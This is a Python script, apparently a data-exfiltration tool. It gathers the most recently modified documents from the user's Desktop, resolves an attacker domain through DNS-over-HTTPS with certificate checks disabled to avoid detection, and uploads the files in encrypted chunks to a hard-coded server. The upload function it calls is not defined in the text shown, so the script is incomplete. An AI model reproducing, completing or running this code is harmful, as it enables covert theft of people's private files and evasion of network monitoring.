import os, glob, requests, logging, struct, base64, random, time, httpx
from datetime import datetime
import urllib3
from dnslib import DNSRecord
from colorama import Fore, Style, init
from cryptography.fernet import Fernet

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

key = Fernet.generate_key()
cipher_suite = Fernet(key)
CHUNK_SIZE = 1024 * 50  # 50 KB per chunk
DOH_URLS = [
    "https://cloudflare-dns.com/dns-query",
    "https://dns.google/dns-query",
    "https://dns.quad9.net/dns-query",
    "https://dns.cloudflare.com/dns-query"
]

def create_dns_query(domain):
    return DNSRecord.question(domain, "A").pack() 

def decode_dns_response(data):
    response = DNSRecord.parse(data)
    
    print(f"\n{Fore.YELLOW}[ * ] DNS Response Details:")
    server_ip = None  

    for answer in response.rr:
        if answer.rtype == 1:
            server_ip = str(answer.rdata)
            print(f"{Fore.CYAN}    - IP Address: {server_ip}")

    if server_ip:
        print(f"{Fore.GREEN}[ + ] Successfully retrieved IP: {server_ip}\n")
    else:
        print(f"{Fore.RED}[ ! ] No valid A record found in response.\n")

    return server_ip  

def doh_query(domain, doh_url):
    query = create_dns_query(domain)
    headers = {
        'Content-Type': 'application/dns-message',
        'Accept': 'application/dns-message'
    }
    dns_query_b64 = base64.urlsafe_b64encode(query).decode('utf-8').rstrip('=')
    full_url = f"{doh_url}?dns={dns_query_b64}"
    
    print(f"{Fore.YELLOW}[ * ] Performing DoH Query on {domain} using {doh_url}")

    with httpx.Client(http2=True, verify=False) as client:
        response = client.get(full_url, headers=headers)
        response.raise_for_status()
        data = response.content
        return decode_dns_response(data)  

def get_important_files(directory, number_of_files):
    print(f"{Fore.CYAN}[ * ] Fetching important files from {directory}")

    file_types = ('*.txt', '*.pdf', '*.docx', '*.xlsx')
    important_files = []

    for file_type in file_types:
        important_files.extend(glob.glob(os.path.join(directory, file_type)))

    important_files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
    recent_files = important_files[:number_of_files]

    print(f"{Fore.GREEN}[ + ] Found important files: {recent_files}")
    return recent_files

if __name__ == "__main__":

    desktop_dir = os.path.join(os.path.expanduser("~"), "Desktop")
    important_files = get_important_files(desktop_dir, 5)

    domain = "everythingBlackkk.com"  
    server_ip = "192.168.1.6" 

    if server_ip == "0":
        chosen_doh = random.choice(DOH_URLS)
        resolved_ip = doh_query(domain, chosen_doh)
        print("\n[!] Ip Is : ",resolved_ip)
        
        if resolved_ip:
            server_ip = resolved_ip 
            print(f"{Fore.GREEN}[ + ] Updated server_ip from DoH: {server_ip}")
        else:
            print(f"{Fore.RED}[ ! ] Failed to resolve server IP using DoH providers.")

    if server_ip and server_ip != "0":
        print(f"{Fore.GREEN}[ + ] Using resolved server IP: {server_ip}")
        for file in important_files:
            send_file_in_chunks(file, server_ip, cipher_suite)
    else:
        print(f"{Fore.RED}[ ! ] No valid server IP found. Aborting file upload.")
